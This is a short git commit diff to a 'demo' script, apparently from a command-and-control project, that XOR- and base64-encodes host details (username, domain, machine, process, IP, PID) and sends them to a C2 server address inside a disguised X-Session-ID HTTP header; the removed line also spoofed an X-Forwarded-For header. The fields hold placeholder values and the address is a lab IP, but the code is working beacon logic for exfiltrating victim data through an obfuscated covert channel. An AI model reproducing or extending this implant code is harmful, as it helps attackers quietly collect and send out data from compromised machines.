3c91df3671d50a066c311dc1e4805657475c6df2
Fawaz <q8fawazo@hotmail.com>
2022-10-02 05:35:16 -0400

    Fixed the demo

--- demo/app.py
+++ demo/app.py
@@ -14,14 +14,13 @@ def xor(data):
 
 def main():
     # This is the payload that will be sent to the C2
-    payload = "username=test,domain=test,machine=test,process=test,version=test,arch=test,ip=test,pid=test"
+    payload = "username=test&domain=test&machine=test&process=test&version=test&arch=test&ip=test&pid=test"
     # XOR the payload with the key
     payload = xor(payload.encode('utf-8'))
     # base64 encode the payload
     payload = base64.b64encode(payload)
     # Send the payload to the C2
-    request = requests.get("http://192.168.17.131:8001"+C2['path'], headers={
-                           "X-Forwarded-For": "192.168.17.1", "X-Session-ID": "j4mfiJSbl5/HnJuNm4DcipOex8vPzcjcl5uZkpOUn8e+v6mxrrWq173NtMy7v87cnpWXm5OUx76/qbGutarXvc20zLu/ztybiJmSx7u3vszO3IqIlZmfiYnHvsCmmZ+IjqaXm5OU1J+Cn9yMn4iJk5WUx62TlJ6VjYnay8raqoiV"})
+    request = requests.get("http://192.168.17.131:8001"+C2['path'], headers={"X-Session-ID": payload})
     print(request.text)
 
 
